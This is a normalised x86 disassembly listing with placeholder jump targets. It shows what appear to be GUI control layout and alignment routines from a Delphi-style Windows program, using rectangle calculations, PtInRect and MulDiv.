mov ecx [ ebx + 0x4 ]
mov edx 0xb043
mov eax esi
call sub_44e340
mov [ ebx + 0xc ] eax
sub_44ee5c
push ebx
mov ebx eax
cmp [ ebx + 0x59 ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x68 ]
mov eax ebx
call sub_44d280
mov edx [ edx + 0x8 ]
mov eax ebx
call sub_44d280
jmp r-xdata
mov [ ebx + 0x59 ] 0x1
sub_44eef0
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
xor esi esi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
test eax eax
je r-xdata
mov eax esi
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov edi eax
mov eax ebx
call sub_4030d8
cmp edi eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov dl 0x1
call [ eax + 0x2c ]
mov esi eax
mov edx [ esp + 0x4 ]
mov eax esi
call sub_44c920
mov edx [ esp ]
mov eax esi
call sub_44c8fc
mov edx [ esp + 0x8 ]
sub edx [ esp ]
mov eax esi
call sub_44cba8
mov edx [ esp + 0xc ]
sub edx [ esp + 0x4 ]
mov eax esi
call sub_44cbec
sub_44ef74
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
lea ecx [ ebp - 0x10 ]
mov eax [ edi ]
mov edx [ eax + 0x44 ]
mov eax [ edi ]
mov eax [ eax + 0x40 ]
call sub_416e0c
lea edx [ ebp - 0x10 ]
lea ecx [ ebp - 0x8 ]
mov eax [ edi ]
mov eax [ eax + 0x30 ]
call sub_44cca4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
lea ebx [ eax + 0x44 ]
mov eax [ ebx + 0xc ]
sub eax [ ebx + 0x4 ]
mov edx [ edi ]
mov esi [ edx + 0x30 ]
add eax [ esi + 0x4c ]
mov edx [ edi ]
sub eax [ edx + 0x4c ]
push eax
lea eax [ ebp - 0x20 ]
push eax
mov ecx [ ebx + 0x8 ]
sub ecx [ ebx ]
add ecx [ esi + 0x48 ]
mov eax [ edi ]
sub ecx [ eax + 0x48 ]
mov edx [ esi + 0x44 ]
add edx [ ebx + 0x4 ]
sub edx [ ebp - 0x4 ]
mov eax [ esi + 0x40 ]
add eax [ ebx ]
sub eax [ ebp - 0x8 ]
call sub_416e5c
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_44cb4c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44f000
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
lea edx [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
call sub_44eef0
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ eax + 0x4 ] ebx
mov eax ebx
call sub_453a88
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x8 ]
mov [ edx + 0x8 ] eax
push ebp
call sub_44ef74
pop ecx
jmp r-xdata
sub_44f060
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_44f14e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44f155
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f44
retn
test bl bl
je r-xdata
mov edx [ edi + 0x64 ]
mov eax esi
call sub_44d1bc
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_44d18c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov dl [ edi + 0x6a ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x64 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
cmp al 0x1
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_44d18c
mov eax [ ebp - 0x8 ]
mov edx [ esi + 0x8 ]
call sub_40432c
jne r-xdata
lea eax [ esi + 0x80 ]
mov edx [ edi + 0x7c ]
call sub_403f74
cmp [ esi + 0x80 ] 0x0
jne r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x86 ]
mov eax esi
call sub_44d0ac
cmp [ esi + 0x57 ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x40 ]
mov [ esi + 0x120 ] eax
mov eax [ edi + 0x44 ]
mov [ esi + 0x124 ] eax
cmp [ esi + 0x122 ] 0x0
jne r-xdata
test bl bl
je r-xdata
sub_44f15c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
cmp esi eax
jne r-xdata
pop esi
pop ebx
retn
xor ecx ecx
mov edx esi
mov eax ebx
mov si 0xffef
call sub_40338c
sub_44f188
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44f1a8
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44f1c8
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44f1e8
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44f208
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44f228
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44f248
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_420ba4
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
mov eax ebx
call sub_44c7e0
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx eax
mov cl 0x1
mov eax ebx
mov si 0xffef
call sub_40338c
sub_44f280
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_44f31c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_418b68
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
mov edx eax
mov edi esi
mov eax edi
call sub_459c50
mov edx [ ebx + 0x80 ]
mov eax edi
call sub_459d88
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_44d18c
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_459ae8
mov dl [ ebx + 0x57 ]
mov eax edi
call sub_459ea8
push [ ebx + 0x124 ]
push [ ebx + 0x120 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44f323
lea eax [ ebp - 0x4 ]
call sub_403f20
retn
sub_44f32c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
xor ebx ebx
mov ecx edx
test ecx ecx
jle r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
mov esi 0x1
mov edx [ ebp - 0x4 ]
add edx 0x8
inc esi
add edx 0x8
dec ecx
jne r-xdata
mov ebx esi
fld [ edx ]
mov eax [ ebp - 0x4 ]
fcomp [ eax + ebx * 8 ]
fnstsw ax
sahf
jae r-xdata
sub_44f368
push ebx
push esi
push edi
push ebp
add esp 0xffffffc8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor ebx ebx
mov esi [ eax + 0x48 ]
mov edi [ eax + 0x4c ]
mov eax [ esp ]
test eax eax
jg r-xdata
cmp esi eax
jg r-xdata
mov bl 0x3
jmp r-xdata
mov edx [ esp + 0x4 ]
test edx edx
jg r-xdata
mov bl 0x4
jmp r-xdata
mov eax ebx
add esp 0x38
pop ebp
pop edi
pop esi
pop ebx
retn
cmp edi edx
jg r-xdata
mov bl 0x1
jmp r-xdata
mov ebp edx
sub edi edx
mov [ esp + 0x8 ] eax
sub esi eax
fild [ esp + 0x8 ]
fstp [ esp + 0xc ]
fwait
mov [ esp + 0x2c ] esi
fild [ esp + 0x2c ]
fstp [ esp + 0x14 ]
fwait
mov [ esp + 0x30 ] ebp
fild [ esp + 0x30 ]
fstp [ esp + 0x1c ]
fwait
mov [ esp + 0x34 ] edi
fild [ esp + 0x34 ]
fstp [ esp + 0x24 ]
fwait
lea eax [ esp + 0xc ]
mov edx 0x3
call sub_44f32c
sub eax 0x1
jb r-xdata
mov bl 0x2
jmp r-xdata
mov bl 0x3
jmp r-xdata
je r-xdata
mov bl 0x4
jmp r-xdata
dec eax
je r-xdata
mov bl 0x1
jmp r-xdata
dec eax
je r-xdata
mov bl 0x2
jmp r-xdata
sub_44f418
push ebx
mov ebx eax
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov edx eax
mov eax [ ebx + 0xa0 ]
call sub_40331c
test al al
jne r-xdata
mov al 0x1
pop ebx
retn
sub_44f44c
push ebx
test [ eax + 0x1c ] 0x1
jne r-xdata
pop ebx
retn
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x4c ]
push edx
mov ecx [ eax + 0x44 ]
mov edx [ eax + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
sub_44f46c
push ebx
push esi
push edi
mov edi eax
mov ebx edx
mov eax edi
mov si 0xffc8
call sub_40338c
test al al
je r-xdata
mov eax edi
call sub_44f4ac
or ebx eax
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax ebx
and eax 0x2
cmp eax 0x2
jne r-xdata
mov eax ebx
and eax 0x1
dec eax
je r-xdata
and ebx 0xfffffffd
jmp r-xdata
or ebx 0x2
sub_44f4d8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ edi + 0x8 ]
lea edx [ eax + 0x38 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x78 ]
test al al
jne r-xdata
mov [ edi + 0xc ] 0x1
sub_44f504
push ebx
push esi
push edi
push ebp
add esp 0xffffffd4
mov ebp edx
mov edi eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
add esp 0x2c
pop ebp
pop edi
pop esi
pop ebx
retn
test [ edi + 0x1c ] 0x10
je r-xdata
mov edx esp
mov eax [ ebp + 0x8 ]
call sub_406b00
mov eax esp
call sub_416e84
test al al
je r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax edi
call sub_44ccd0
push [ esp + 0xc ]
push [ esp + 0xc ]
lea edx [ esp + 0x1c ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x1c ]
push eax
call PtInRect
test eax eax
jne r-xdata
mov eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
jmp r-xdata
mov [ esp + 0x10 ] 0x0
lea ecx [ esp + 0x10 ]
lea edx [ esp + 0x8 ]
mov eax edi
mov si 0xffe6
call sub_40338c
xor eax eax
mov al [ esp + 0x10 ]
mov [ ebp + 0xc ] eax
cmp [ esp + 0x10 ] 0x0
jne r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
mov eax edi
mov si 0xffd6
call sub_40338c
mov ebx eax
test ebx ebx
je r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebx + 0x61 ] 0x0
je r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor edx edx
mov eax edi
call sub_44ccfc
mov [ ebx + 0x64 ] edi
mov eax esp
call sub_416e84
test al al
je r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov [ ebp + 0xc ] 0x1
lea ecx [ esp + 0x24 ]
xor edx edx
xor eax eax
call sub_416e0c
lea edx [ esp + 0x24 ]
mov ecx esp
mov eax edi
call sub_44cca4
sub_44f62c
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
cmp [ eax + 0x132 ] 0x0
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
push ecx
mov ebx eax
mov edx eax
lea ecx [ esp + 0x4 ]
mov eax [ ebx + 0x134 ]
call [ ebx + 0x130 ]
sub_44f66c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] ebx
mov esi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_44f76e
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
jne r-xdata
test esi esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x30 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
mov [ ebx ] edx
mov edx [ eax + 0x4 ]
mov [ ebx + 0x4 ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
add [ ebx ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
add [ ebx + 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x0
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405c50
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8a0
call sub_40395c
test eax eax
jne r-xdata
cmp [ eax + 0x30 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44f775
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_403f44
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x0
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_405c50
mov ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8a0
call sub_40395c
cmp esi eax
je r-xdata
mov edx [ eax + 0x40 ]
add [ ebx ] edx
mov edx [ eax + 0x44 ]
add [ ebx + 0x4 ] edx
mov eax [ eax + 0x30 ]
test eax eax
jne r-xdata
sub_44f780
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44bed0
mov eax esi
mov edx [ r-xdata ]
call sub_403340
mov [ ebx + 0x20 ] eax
pop esi
pop ebx
retn
sub_44f7b4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor eax eax
push ebp
push sub_44f8ac
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax ebx
call sub_44c28c
push ebx
push sub_451244
call sub_4217e4
mov [ ebx + 0x18c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_424064
mov esi eax
mov [ ebx + 0x170 ] esi
mov edx [ ebx + 0x70 ]
mov eax esi
call sub_42420c
mov [ ebx + 0x1a9 ] 0x1
mov [ ebx + 0x1a0 ] 0xffffffff
mov [ ebx + 0x184 ] 0x3
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x11
jne r-xdata
add esp 0xfffffff0
call sub_4034f4
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46b19c
mov edx [ ebp - 0x8 ]
lea eax [ ebx + 0x188 ]
call sub_403f74
lea eax [ ebx + 0x188 ]
call sub_403f20
jmp r-xdata
mov [ ebx + 0x1a7 ] 0x0
mov al [ r-xdata ]
mov [ ebx + 0x162 ] al
mov [ ebx + 0x163 ] 0x2
mov [ ebx + 0x164 ] 0x1
mov [ ebx + 0x168 ] 0x1
mov [ ebx + 0x150 ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44f8b3
lea eax [ ebp - 0x8 ]
call sub_403f20
retn
sub_44f8b3
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
sub_44f8d8
push ebx
push esi
push edi
call sub_40355c
mov ebx edx
mov edi eax
mov eax edi
call sub_4209f4
cmp [ edi + 0x1a8 ] 0x0
je r-xdata
lea eax [ edi + 0x17c ]
call sub_40578c
mov eax [ edi + 0x178 ]
call sub_403190
cmp [ edi + 0x30 ] 0x0
je r-xdata
mov [ edi + 0x1a8 ] 0x0
xor edx edx
mov eax edi
call sub_44ae38
cmp [ edi + 0x180 ] 0x0
je r-xdata
mov dl 0x1
mov eax edi
call sub_450578
mov eax edi
call sub_4507b8
test eax eax
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0xac ]
mov eax [ edi + 0x170 ]
call sub_403190
mov eax [ edi + 0x18c ]
test eax eax
je r-xdata
mov edx eax
dec edx
mov eax edi
call sub_45077c
mov esi eax
mov edx esi
mov eax edi
call sub_4505e4
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov eax edi
call sub_4507b8
test eax eax
jne r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_44c364
test bl bl
jle r-xdata
call sub_42187c
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_403544
sub_44f9a8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x19c ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403160
mov [ ebp - 0xc ] eax
xor ecx ecx
push ebp
push sub_44fa6c
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_418668
mov ebx [ ebp - 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov ebx [ ebp - 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403190
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
cmp edx [ ebp - 0x8 ]
jge r-xdata
inc esi
dec ebx
jne r-xdata
mov edx esi
call sub_453c48
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
mov edx esi
call sub_418470
mov edx [ eax + 0x1a0 ]
test edx edx
jl r-xdata
mov ecx eax
mov eax [ ebp - 0xc ]
call sub_4185bc
mov edx esi
mov eax [ ebp - 0xc ]
call sub_418470
test eax eax
je r-xdata
sub_44fa7c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_450320
xor eax eax
push ebp
push sub_44fabc
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44c5c8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44fac3
mov eax [ ebp - 0x4 ]
call sub_450328
retn
sub_44fac3
mov eax [ ebp - 0x4 ]
call sub_44f9a8
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_45117c
pop ebx
pop ecx
pop ebp
retn
push 0x0
xor ecx ecx
mov edx 0xb011
mov eax [ ebp - 0x4 ]
call sub_44e340
sub_44faf8
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
xor ecx ecx
xor ebx ebx
mov bl [ ebp - 0x1 ]
cmp ebx 0x6
ja r-xdata
mov eax ecx
pop ebx
pop ecx
pop ebp
retn
jmp [ ebx * 4 + jump_table_44fb13 ]
mov edx [ edx + 0x44 ]
cmp edx [ eax + 0x44 ]
setg cl
jmp r-xdata
mov ecx [ edx + 0x44 ]
add ecx [ edx + 0x4c ]
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
cmp ecx edx
setle cl
jmp r-xdata
mov edx [ edx + 0x40 ]
cmp edx [ eax + 0x40 ]
setg cl
jmp r-xdata
mov ecx [ edx + 0x40 ]
add ecx [ edx + 0x48 ]
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
cmp ecx edx
setle cl
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx - 0x4 ]
xchg ecx eax
xchg ecx edx
mov ebx [ eax ]
call [ ebx + 0xa4 ]
mov ecx eax
sub_44fb84
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x30 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x90 ] 0x0
je r-xdata
xor eax eax
mov al [ ebp - 0x5 ]
mov al [ eax + rw-data ]
mov edx [ ebp - 0x4 ]
cmp al [ edx + 0x61 ]
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x94 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jl r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_453d8c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x14 ] eax
mov al [ ebp - 0x5 ]
add al 0xfd
sub al 0x2
jb r-xdata
lea ecx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x30 ]
mov edx [ ebx + 0x4c ]
mov eax [ ebx + 0x48 ]
call sub_416e0c
lea edx [ ebp - 0x40 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x34 ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
mov [ ebp - 0x18 ] eax
mov al [ ebp - 0x5 ]
dec eax
sub al 0x2
jb r-xdata
sub al 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x1
xor eax eax
push ebp
push sub_44ff05
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44ff0c
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x0
retn
jmp [ eax * 4 + jump_table_44fe1a ]
sub al 0x3
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
jl r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x88 ]
push eax
call MulDiv
mov edx [ ebp - 0x14 ]
sar edx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x88 ]
mov edx [ ebp - 0x20 ]
sub edx eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x88 ]
mov edx [ ebp - 0x20 ]
sub edx eax
mov [ ebp - 0x14 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x18 ]
add [ eax + 0x4 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x18 ]
sub [ eax + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0xc ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x14 ]
add [ eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x14 ]
sub [ eax + 0x8 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
lea ecx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xa8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
